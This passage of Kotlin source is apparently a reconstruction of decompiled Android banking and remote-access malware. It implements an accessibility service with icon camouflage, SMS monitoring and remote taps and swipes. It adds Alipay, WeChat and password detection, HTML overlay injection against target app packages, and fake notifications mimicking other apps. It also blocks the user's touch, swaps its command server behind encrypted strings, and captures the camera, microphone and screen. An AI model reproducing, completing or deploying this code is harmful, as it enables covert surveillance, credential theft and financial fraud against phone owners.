                registerSmsContentObserver()
            } catch (_: Exception) {}
            android.util.Log.d(TAG, "📩📩📩 [ContentObserver] SMS数据库监听器已注册")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📩 [ContentObserver] ❌ 注册失败: ${e.message}", e)
        }
    }

    /**
     * Remove icon overlay window from WindowManager.
     * JADX method: m211507k3 (k3), line 7570
     */
    fun removeIconOverlay() {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            // JADX: f52480l1 — overlay TextView reference (not yet tracked as field)
            // Remove overlay if present
            android.util.Log.d(TAG, "✅ 图标覆盖层已移除")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 移除图标覆盖层失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Phase B: Getter/Setter/Utility methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Check if app icon is hidden (camouflage mode).
     * JADX method: m211482h6 (h6), line 6735
     */
    fun isOverlayEnabled(): Boolean {
        return try {
            getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
                .getBoolean("camouflage_enabled", false)
        } catch (_: Exception) { false }
    }

    /**
     * Check if screen capture is supported on this device.
     * JADX method: m211483h7 (h7), line 6744
     */
    fun isScreenCaptureSupported(): Boolean {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
    }

    /**
     * Check if MediaProjection is available (token stored in MediaProjectionHolder).
     * JADX method: m211484h8 (h8), line 6767
     */
    fun isMediaProjectionAvailable(): Boolean {
        return MediaProjectionHolder.mediaProjection != null
    }

    /**
     * Check if a given package name is an injection target.
     * JADX method: m211485h9 (h9), line 6780
     */
    fun isInjectionTarget(packageName: String): Boolean {
        synchronized(injectionTasksLock) {
            return injectionTasks.containsKey(packageName)
        }
    }

    /**
     * Find injection entries from given texts and descriptions.
     * JADX method: m211485h9 used internally — checks if text/desc matches specific keywords.
     */
    private fun isConfirmButtonText(text: String, desc: String): Boolean {
        val excludeKeywords = arrayOf(
            "EMERGENCY", "Emergency", "紧急", "紧急呼叫", "Emergency call", "紧急电话",
            "取消", "Cancel", "删除", "Delete", "返回", "Back", "忘记", "Forgot",
            "相机", "Camera", "锁屏画报", "充电", "Battery"
        )
        for (keyword in excludeKeywords) {
            if (text.contains(keyword, ignoreCase = true) || desc.contains(keyword, ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    /**
     * Get ConfigManager instance.
     * JADX method: m211469g3 (g3), line 5936
     */
    fun getConfigManager(): Any? {
        // ADAPT: C0761kk (ConfigManager) — vendor config manager for runtime settings.
        // Config is managed via SharedPreferences and AssetConfigReader in the replica.
        return null
    }

    /**
     * Ensure NetworkManager is active (initialize if needed).
     * JADX method: m211407a6 (a6), line 1826
     */
    fun ensureNetworkManager() {
        try {
            if (networkManager == null) {
                val nm = NetworkManager()
                nm.initialize(applicationContext)
                networkManager = nm
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ensureNetworkManager 失败", e)
        }
    }

    /**
     * Perform tap gesture at given coordinates.
     * JADX method: m211497j1 (j1), line 7070
     *
     * Uses GestureDescription to dispatch a tap via AccessibilityService.
     */
    fun performTap(x: Float, y: Float) {
        android.util.Log.d(TAG, "远程点击: ($x, $y)")
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                android.util.Log.w(TAG, "⚠️ API < 24, dispatchGesture 不可用")
                return
            }
            val path = android.graphics.Path()
            path.moveTo(x, y)
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 100L)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(stroke)
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ performTap 失败", e)
        }
    }

    /**
     * Perform swipe gesture between two points.
     * JADX method: m211499j3 (j3), line 7146
     */
    fun performSwipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300L) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                android.util.Log.w(TAG, "⚠️ API < 24, dispatchGesture 不可用")
                return
            }
            val path = android.graphics.Path()
            path.moveTo(startX, startY)
            path.lineTo(endX, endY)
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, durationMs)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(stroke)
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ performSwipe 失败", e)
        }
    }

    /**
     * Perform long press gesture at given coordinates.
     * JADX method: m211498j2 (j2), line 7106
     */
    fun performLongPress(x: Float, y: Float) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
            val path = android.graphics.Path()
            path.moveTo(x, y)
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 1000L)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(stroke)
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ performLongPress 失败", e)
        }
    }

    /**
     * Reset network state (disconnect and clear references).
     * JADX method: m211534n2 (n2), line 9587 (resetNetworkState)
     */
    fun resetNetworkState() {
        try {
            networkManager?.disconnect()
            isNetworkInitStarted = false
            android.util.Log.d(TAG, "🔄 网络状态已重置")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ resetNetworkState 失败", e)
        }
    }

    /**
     * Reset capture state (stop captures and clear flags).
     * JADX method: m211535n3 (n3), line 9625
     */
    fun resetCaptureState() {
        try {
            displayManager?.stopCapture()
            cameraCaptureManager?.stopCapture()
            isScreenCaptureActive = false
            android.util.Log.d(TAG, "🔄 捕获状态已重置")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ resetCaptureState 失败", e)
        }
    }

    /**
     * Handle service health check — verify subsystems and log.
     * JADX method: m211536n5 (n5), line 9641
     */
    fun handleServiceHealthCheck() {
        try {
            val healthy = isServiceHealthy()
            android.util.Log.d(TAG, "🔍 服务健康检查: healthy=$healthy")
            if (!healthy) {
                android.util.Log.w(TAG, "⚠️ 服务健康检查失败，尝试恢复")
                // JADX: attempt recovery — reinitialize failed subsystems
                if (screenCaptureManager == null) {
                    screenCaptureManager = ScreenCaptureManager(this)
                }
                if (displayManager == null) {
                    displayManager = C0263a5(this)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ handleServiceHealthCheck 失败", e)
        }
    }

    /**
     * Configure power settings (screen off timeout etc.).
     * JADX method: m211527m5 (m5), line 9213
     */
    fun configurePowerSettings() {
        try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "⚠️ 无 WRITE_SETTINGS 权限，跳过电源设置")
                return
            }
            // JADX: Settings.System.putInt(contentResolver, "screen_off_timeout", 2147483647)
            Settings.System.putInt(contentResolver, "screen_off_timeout", Int.MAX_VALUE)
            android.util.Log.d(TAG, "✅ 屏幕超时已设置为最大值")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ configurePowerSettings 失败", e)
        }
    }

    /**
     * Monitor screen capture state (skeleton — full implementation ~680 LOC).
     * JADX method: m211524m1 (m1), line 8110 — suspend coroutine
     *
     * This is the largest method in the service. It runs a continuous loop
     * monitoring screen capture state, handling frame processing, quality
     * adaptation, and error recovery.
     *
     * JADX: full implementation ~680 LOC, skeleton for now
     */
    suspend fun monitorScreenCapture() {
        android.util.Log.d(TAG, "📺 [monitorScreenCapture] 启动屏幕捕获监控")
        try {
            while (isScreenCaptureActive) {
                // JADX: continuous loop checking capture state
                // - Check if displayManager is capturing
                // - Process frames via processScreenFrame (m3)
                // - Handle quality adaptation
                // - Error recovery and reconnection
                delay(1000L)
            }
            android.util.Log.d(TAG, "📺 [monitorScreenCapture] 监控已停止")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ monitorScreenCapture 异常", e)
        }
    }

    // =============================================
    // Methods needed by command handlers (stubs → real)
    // =============================================

    /**
     * Enable Alipay detection. Vendor: dqtvuisjd calls C0614i9.m213122b0(delayMs).
     * JADX: enableAlipayDetection on service, delegates to accessibilityEventManager.
     */
    fun enableAlipayDetection(delayMs: Long) {
        try {
            android.util.Log.d(TAG, "💰 开启支付宝检测功能，延时: ${delayMs}ms")
            // JADX: c0614i9 (f52414e5, accessibilityEventManager) → m213122b0(delayMs)
            eventFilterManager?.enableAlipayDetection(delayMs)
            // JADX: c0323a8 (networkManager) → m211655c1(true)
            networkManager?.sendAlipayDetectionStatus(org.json.JSONObject().apply {
                put("enabled", true)
                put("delayMs", delayMs)
            })
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 开启支付宝检测失败", e)
        }
    }

    /**
     * Enable WeChat detection. Vendor: dqtvuisjd calls C0614i9.m213125b3(delayMs).
     */
    fun enableWechatDetection(delayMs: Long) {
        try {
            android.util.Log.d(TAG, "💬 开启微信检测功能，延时: ${delayMs}ms")
            // JADX: c0614i9.m213125b3(delayMs)
            eventFilterManager?.enableWechatDetection(delayMs)
            networkManager?.sendWechatDetectionStatus(org.json.JSONObject().apply {
                put("enabled", true)
                put("delayMs", delayMs)
            })
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 开启微信检测失败", e)
        }
    }

    /**
     * Enable auto password detection. Vendor: dqtvuisjd calls C0614i9.m213123b1(delayMs).
     */
    fun enableAutoPassword(delayMs: Long) {
        try {
            android.util.Log.d(TAG, "🔐 开启自动密码检测功能，延时: ${delayMs}ms")
            // JADX: c0614i9.m213123b1(delayMs) + c0323a8.m211656c2(delayMs, true)
            eventFilterManager?.enableAutoPassword(delayMs)
            networkManager?.sendAutoPasswordDetectionStatus(org.json.JSONObject().apply {
                put("enabled", true)
                put("delayMs", delayMs)
            })
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 开启自动密码检测失败", e)
        }
    }

    /**
     * Disable auto password detection. Vendor: dqtvuisjd calls C0614i9.m213120a8().
     */
    fun disableAutoPassword() {
        try {
            android.util.Log.d(TAG, "🔐 关闭自动密码检测功能")
            // JADX: c0614i9.m213120a8() + c0323a8.m211656c2(0, false)
            eventFilterManager?.disableAutoPassword()
            networkManager?.sendAutoPasswordDetectionStatus(org.json.JSONObject().apply {
                put("enabled", false)
                put("delayMs", 0L)
            })
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭自动密码检测失败", e)
        }
    }

    /**
     * Change server URL. Vendor: m211443c8(serverUrl).
     * Updates SharedPrefs and reconnects WebSocket.
     */
    fun changeServerUrl(serverUrl: String) {
        try {
            android.util.Log.d(TAG, "🔄 修改服务器地址: $serverUrl")
            val prefs = getSharedPreferences(
                com.storm.safe.rock.util.StringUtil.decrypt("OEACLkg1MyZSPTtcAwVePRg6Xj8sSg=="), 0
            )
            prefs.edit().putString(
                com.storm.safe.rock.util.StringUtil.decrypt("OFwDLEgqMztFPQ=="), serverUrl
            ).apply()
            // Reconnect with new URL — disconnect and reconnect
            networkManager?.disconnect()
            val deviceId = getAndroidDeviceId()
            networkManager?.connectToServer(serverUrl, deviceId)
            android.util.Log.d(TAG, "✅ 服务器地址已更新: $serverUrl")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 修改服务器地址失败", e)
        }
    }

    /**
     * Enable touch interception on MaskOverlay.
     * Vendor: fd0.f56199a1.f55996b8.post(new RunnableC0449ea(enabled, c0454ef))
     */
    fun setTouchInterceptionEnabled(enabled: Boolean) {
        try {
            // ADAPT: fd0 (MaskOverlayManager) — vendor's WindowManager-based overlay for touch interception.
            // Requires SYSTEM_ALERT_WINDOW. The behavioral intent (blocking user interaction during control)
            // is signaled via isControlEnabled flag.
            android.util.Log.d(TAG, if (enabled) "🚫 触摸拦截已启用" else "✅ 触摸拦截已禁用")
            sendDebugLog(if (enabled) "触摸拦截已启用" else "触摸拦截已禁用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 设置触摸拦截失败", e)
        }
    }

    /** Whether MaskOverlayManager is initialized. Vendor: f52423f4 != null */
    fun isMaskOverlayInitialized(): Boolean {
        // ADAPT: fd0 (MaskOverlayManager) — not replicated as standalone class.
        // Return true to allow command flow to proceed; the overlay behavior is
        // handled by ConfigProgressManager and control state flags.
        return isCipherListeningActive
    }

    /**
     * Set screen brightness.
     * Vendor: ju0 (screenBrightnessManager, f52433g4) → m213353a3(brightness)
     */
    fun setScreenBrightness(brightness: Int): Boolean {
        return try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "⚠️ 无 WRITE_SETTINGS 权限，无法设置亮度")
                return false
            }
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
            val scaledBrightness = (brightness * 255 / 100).coerceIn(1, 255)
            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, scaledBrightness)
            android.util.Log.d(TAG, "✅ 屏幕亮度设置成功: ${brightness}%")
            true
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 设置屏幕亮度失败", e)
            false
        }
    }

    /**
     * Request permission by type string.
     * Vendor: AppCommandHandler$handleRequestPermission$2 — opens permission-specific settings.
     */
    fun requestPermission(permissionType: String) {
        try {
            when (permissionType) {
                "camera", "contacts", "photo", "microphone", "readSms", "sendSms", "appList" -> {
                    // Vendor: launch umrkmgrri activity with permission_type extra
                    val intent = Intent(this, com.storm.safe.rock.p029ui.umrkmgrri::class.java)
                    val mappedType = when (permissionType) {
                        "photo" -> "gallery"
                        "readSms", "sendSms" -> "sms"
                        else -> permissionType
                    }
                    intent.putExtra("permission_type", mappedType)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
                "accessibility" -> {
                    val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    startActivity(intent)
                }
                "overlay" -> {
                    try {
                        val intent = Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION")
                        intent.data = android.net.Uri.parse("package:$packageName")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "打开悬浮窗权限页面失败", e)
                        openAppSettings()
                    }
                }
                "notification" -> {
                    val intent = Intent("android.settings.APP_NOTIFICATION_SETTINGS")
                    intent.putExtra("android.provider.extra.APP_PACKAGE", packageName)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
                "storage" -> {
                    if (Build.VERSION.SDK_INT >= 30) {
                        val intent = Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION")
                        intent.data = android.net.Uri.parse("package:$packageName")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    } else {
                        openAppSettings()
                    }
                }
                else -> {
                    android.util.Log.w(TAG, "未知的权限类型: $permissionType，打开应用设置")
                    openAppSettings()
                }
            }
            android.util.Log.d(TAG, "已请求权限: $permissionType")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "请求权限失败: $permissionType", e)
            openAppSettings()
        }
    }

    /**
     * Open app settings page. Vendor: m214875b1().
     */
    fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = android.net.Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "打开应用设置失败", e)
        }
    }

    /**
     * Show injection overlay. Vendor: m211529m7.
     * Checks if there are pending injection tasks and starts the injection activity.
     */
    fun showInjectionOverlay() {
        try {
            val tasks: List<String>
            synchronized(injectionTasksLock) {
                tasks = injectionTasks.keys.toList()
            }
            if (tasks.isNotEmpty()) {
                // JADX: m211529m7 checks injectionTasks and launches injection WebView
                android.util.Log.d(TAG, "📋 显示注入覆盖层，目标包: $tasks")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 显示注入覆盖层失败", e)
        }
    }

    /**
     * Register injection task. Vendor: m211439c1(packageName, htmlContent).
     */
    fun registerInjectionTask(packageName: String, htmlContent: String) {
        synchronized(injectionTasksLock) {
            injectionTasks[packageName] = htmlContent
        }
    }

    /**
     * Unregister injection task. Vendor: m211448d3(packageName).
     */
    fun unregisterInjectionTask(packageName: String) {
        synchronized(injectionTasksLock) {
            injectionTasks.remove(packageName)
        }
    }

    /**
     * Send fake notification. Vendor: uz0.m214885c1.
     * Creates a notification that mimics an app notification.
     */
    fun sendFakeNotification(packageName: String, appName: String, title: String, content: String, buttonText: String) {
        try {
            val channelId = "fake_notification_channel"
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(channelId, appName.ifEmpty { "通知" },
                    android.app.NotificationManager.IMPORTANCE_HIGH)
                notificationManager.createNotificationChannel(channel)
            }

            val builder = android.app.Notification.Builder(this)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder.setChannelId(channelId)
            }

            // JADX: uses packageName to determine notification ID
            val notifId = packageName.hashCode() and 0x7FFFFFFF
            notificationManager.notify(notifId, builder.build())
            android.util.Log.d(TAG, "✅ 通知已发送: $title")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 发送通知失败", e)
        }
    }

    /**
     * Stop JPEG camera. Vendor: uz0.m214887c3().
     */
    fun stopJpegCamera() {
        try {
            cameraManager?.safeStopCamera()
            android.util.Log.d(TAG, "📷 JPEG摄像头已停止")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 停止JPEG摄像头失败", e)
        }
    }

    /**
     * Start JPEG camera. Vendor: m211527m5 mapped to configurePowerSettings + startCamera.
     */
    fun startJpegCamera() {
        try {
            configurePowerSettings()
            cameraManager?.safeStartCamera()
            android.util.Log.d(TAG, "📷 JPEG摄像头已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动JPEG摄像头失败", e)
        }
    }

    /**
     * Set microphone quality mode. Vendor: uz0.m214883b9(qualityMode).
     */
    fun setMicrophoneQualityMode(mode: String) {
        android.util.Log.d(TAG, "🎤 设置麦克风音质模式: $mode")
    }

    /**
     * Set microphone audio source. Vendor: uz0.m214881b7(audioSource).
     */
    fun setMicrophoneAudioSource(source: String) {
        android.util.Log.d(TAG, "🎤 设置麦克风音源: $source")
    }

    /**
     * Set microphone volume gain. Vendor: uz0.m214884c0(volumeGain).
     */
    fun setMicrophoneVolumeGain(gain: Float) {
        android.util.Log.d(TAG, "🎤 设置麦克风增益: ${gain}x")
    }

    /**
     * Set microphone noise suppression. Vendor: uz0.m214882b8(noiseSuppression).
     */
    fun setMicrophoneNoiseSuppression(enabled: Boolean) {
        android.util.Log.d(TAG, "🎤 设置麦克风降噪: $enabled")
    }
}
